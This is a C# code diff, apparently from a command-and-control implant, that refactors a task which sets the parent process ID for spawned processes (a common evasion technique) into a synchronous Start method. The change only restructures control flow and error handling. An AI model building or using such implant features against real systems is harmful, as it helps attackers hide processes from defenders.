@@ -31,36 +31,38 @@ namespace Tasks
 
         }
 
-        public override System.Threading.Tasks.Task CreateTasking()
+        public override void Start()
         {
-            return new System.Threading.Tasks.Task(() =>
+            TaskResponse resp;
+            PpidParameters parameters = _jsonSerializer.Deserialize<PpidParameters>(_data.Parameters);
+            Process p = null;
+            string errorMsg = "";
+            try
             {
-                TaskResponse resp;
-                PpidParameters parameters = _jsonSerializer.Deserialize<PpidParameters>(_data.Parameters);
-                Process p = null;
-                string errorMsg = "";
-                try
+                p = Process.GetProcessById(parameters.ParentProcessId);
+            }
+            catch (Exception ex)
+            {
+                errorMsg = $"Failed to set PPID to {parameters.ParentProcessId}: {ex.Message}";
+            }
+
+            if (p != null)
+            {
+                if (_agent.GetProcessManager().SetPPID(parameters.ParentProcessId))
                 {
-                    p = Process.GetProcessById(parameters.ParentProcessId);
-                } catch (Exception ex)
-                {
-                    errorMsg = $"Failed to set PPID to {parameters.ParentProcessId}: {ex.Message}";
+                    resp = CreateTaskResponse($"Set PPID to {parameters.ParentProcessId}", true);
                 }
-                if (p != null)
+                else
                 {
-                    if (_agent.GetProcessManager().SetPPID(parameters.ParentProcessId))
-                    {
-                        resp = CreateTaskResponse($"Set PPID to {parameters.ParentProcessId}", true);
-                    } else
-                    {
-                        resp = CreateTaskResponse("Failed to set PPID", true, "error");
-                    }
-                } else
-                {
-                    resp = CreateTaskResponse(errorMsg, true, "error");
+                    resp = CreateTaskResponse("Failed to set PPID", true, "error");
                 }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+            }
+            else
+            {
+                resp = CreateTaskResponse(errorMsg, true, "error");
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
